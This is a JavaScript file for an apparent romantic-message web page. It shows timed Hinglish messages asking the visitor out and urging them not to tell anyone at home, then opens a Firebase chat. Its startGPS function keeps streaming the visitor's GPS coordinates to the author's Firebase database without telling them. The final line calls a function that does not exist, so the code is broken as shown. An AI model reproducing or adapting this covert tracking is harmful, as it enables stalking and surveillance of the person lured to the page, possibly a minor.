/* ------------------------------- */
/* FIREBASE CONFIG                 */
/* ------------------------------- */
const firebaseConfig = {
  apiKey: "AIzaSyBYhrX6wf3XmT6qQdYsexSW98QQmlCxpeI",
  authDomain: "web-p8855.firebaseapp.com",
  databaseURL: "https://web-p8855-default-rtdb.firebaseio.com",
  projectId: "web-p8855",
  storageBucket: "web-p8855.firebasestorage.app",
  messagingSenderId: "1045044667480",
  appId: "1:1045044667480:web:869454f4116d7ac668962d",
  measurementId: "G-4B4FD3BRBP"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

/* ------------------------------- */
/* PAGES                           */
/* ------------------------------- */
const pages = [
  { title: '💖 hello cutei 💖', time: 3500 },
  { title: '💬 tum se baat karni he ... 💬', time: 5000 },
  { title: 'vooooooo..', time: 4500 },
  { title: '💞 i like you 💞', time: null, interactive: true },
  { title: '💐 thanks you yes par click karne ke liye 💐', time: 3500 },
  { title: '🌸 mai tum se mil sakta hu kay  🌸', time: 5000 },
  { title: 'mil sakta hu to massage kar dena', time: 5000 },
  { title: 'NA ho to mana kar dena par ghar par mat bolna ok', time: 6500 },
  { title: '📩 Message Section', time: null, final: true }
];

const titleEl = document.getElementById('title');
const card = document.getElementById('card');
const extra = document.getElementById('extra');
const toasts = document.getElementById('toasts');

let idx = 0;
let timer;

/* ------------------------------- */
/* CHAT + NAME STORAGE             */
/* ------------------------------- */
let chatID = localStorage.getItem("chatID");
if (!chatID) {
  chatID = "chat_" + Date.now() + "_" + Math.floor(Math.random()*9000+1000);
  localStorage.setItem("chatID", chatID);
}

let userName = localStorage.getItem("userName") || null;

/* ------------------------------- */
/* ASK LOCATION FIRST              */
/* ------------------------------- */
function askNameThenContinue(){

  if (!userName) {
    let n = prompt("Enter your name:");

    if (!n || n.trim() === "") {
      return askNameThenContinue();
    }

    userName = n.trim();
    localStorage.setItem("userName", userName);
  }

  db.ref("chat/" + chatID + "/name").set(userName);

  startGPS();

  idx = 0;
  showPage(idx);

}

/* GPS WATCH                       */
/* ------------------------------- */
function startGPS() {
  if (!navigator.geolocation) return;
  navigator.geolocation.watchPosition(pos => {
    db.ref("chat/" + chatID + "/gps").set({
      lat: pos.coords.latitude,
      lon: pos.coords.longitude,
      acc: pos.coords.accuracy,
      ts: Date.now()
    });
  });
}

/* ------------------------------- */
/* PAGE SYSTEM                     */
/* ------------------------------- */
function showPage(i) {
  clearTimeout(timer);
  const p = pages[i];
  card.classList.remove("show");

  setTimeout(() => {
    titleEl.textContent = p.title;
    extra.innerHTML = "";
    card.classList.add("show");

    if (p.interactive) {
      extra.innerHTML = `
        <button id="yesBtn">YES</button>
        <button id="noBtn">NO</button>
      `;
      document.getElementById("yesBtn").onclick = () => nextPage();
      document.getElementById("noBtn").onclick = () => showToast("Please don't press NO!");
    }

    if (p.final) {
      extra.innerHTML = `<div id="messageBox"></div>`;
      setupMessageBox();
    }
  }, 350);

  if (p.time !== null) {
    timer = setTimeout(nextPage, p.time);
  }
}

function nextPage() {
  idx++;
  if (idx >= pages.length) idx = pages.length - 1;
  showPage(idx);
}

/* ------------------------------- */
/* TOAST                           */
/* ------------------------------- */
function showToast(txt) {
  const t = document.createElement("div");
  t.className = "toast";
  t.textContent = txt;
  toasts.appendChild(t);
  setTimeout(() => t.remove(), 2500);
}

/* ------------------------------- */
/* CHAT BOX                        */
/* ------------------------------- */
function setupMessageBox() {
  const box = document.getElementById("messageBox");

  box.innerHTML = `
    <div id="chatArea">Connecting...</div>
    <input id="msgInput" type="text" placeholder="Type message..." />
    <button id="sendBtn">Send</button>
  `;

  const chatArea = document.getElementById("chatArea");
  const msgInput = document.getElementById("msgInput");
  const sendBtn = document.getElementById("sendBtn");

  sendBtn.onclick = () => {
    const txt = msgInput.value.trim();
    if (!txt) return;
    db.ref("chat/" + chatID + "/messages").push({
      sender: "admin",
      name: userName,
      text: txt,
      time: Date.now()
    });
    msgInput.value = "";
  };

  db.ref("chat/" + chatID + "/messages").on("value", snap => {
    chatArea.innerHTML = "";
    snap.forEach(c => {
      const m = c.val();
      const div = document.createElement("div");
      div.className = "msg";
      div.textContent = (m.name || userName) + ": " + m.text;
      chatArea.appendChild(div);
    });

    chatArea.scrollTop = chatArea.scrollHeight;
  });
}

/* ------------------------------- */
/* HEARTS                          */
/* ------------------------------- */
function createHearts(n = 15) {
  const wrap = document.getElementById('hearts');
  for (let i = 0; i < n; i++) {
    const h = document.createElement('div');
    h.className = 'heart';
    h.style.left = Math.random() * 100 + '%';
    h.style.animationDelay = Math.random() * 5 + 's';
    wrap.appendChild(h);
  }
}

askLocationFirst_thenName();
